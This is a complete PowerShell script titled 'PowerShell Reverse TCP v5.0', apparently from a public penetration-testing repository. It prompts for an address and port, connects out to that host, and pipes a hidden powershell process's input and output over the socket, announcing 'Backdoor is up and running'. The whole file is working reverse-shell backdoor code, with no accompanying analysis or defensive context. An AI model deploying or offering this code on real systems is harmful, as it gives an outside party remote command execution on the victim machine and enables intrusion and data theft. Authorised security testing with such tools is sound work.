$addr = $(Read-Host -Prompt "Enter address").Trim();
if (-not $addr) {
	Write-Host "Address is required";
	exit 1;
}
$port = $(Read-Host -Prompt "Enter port number").Trim();
if (-not $port) {
	Write-Host "Port number is required";
	exit 1;
}
# Requires .Net v4.5 or greater.
Write-Host "PowerShell Reverse TCP v5.0 by Ivan Sincek.";
Write-Host "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.";
try {
	$client = New-Object Net.Sockets.TcpClient($addr, $port);
	$stream = $client.GetStream();
	$process = New-Object Diagnostics.Process;
	# change the process to run as necessary
	$process.StartInfo.FileName = "powershell";
	$process.StartInfo.UseShellExecute = $false;
	$process.StartInfo.RedirectStandardInput = $true;
	$process.StartInfo.RedirectStandardOutput = $true;
	$process.StartInfo.RedirectStandardError = $true;
	[void]$process.Start();
	Write-Host "Backdoor is up and running...";
	if (!$process.HasExited) {
		$bytes = [Text.Encoding]::UTF8.GetBytes("SOCKET: Shell has connected! PID: $($process.Id)`n");
		$stream.Write($bytes, 0, $bytes.Length);
		$tasks = @(
			$stream.CopyToAsync($process.StandardInput.BaseStream, 1024);
			$process.StandardOutput.BaseStream.CopyToAsync($stream, 1024);
			$process.StandardError.BaseStream.CopyToAsync($stream, 1024);
		);
		[void][Threading.Tasks.Task]::WaitAny($tasks);
	}
	Write-Host "Backdoor will now exit...";
} catch {
	Write-Host "ERROR: $($_.Exception.Message)";
} finally {
	if ($process) {
		$process.Close();
		$process.Dispose();
		Clear-Variable "process";
	}
	if ($stream) {
		$stream.Close();
		$stream.Dispose();
		Clear-Variable "stream";
	}
	if ($client) {
		$client.Close();
		$client.Dispose();
		Clear-Variable "client";
	}
	[GC]::Collect();
}
Clear-Variable "addr";
Clear-Variable "port";
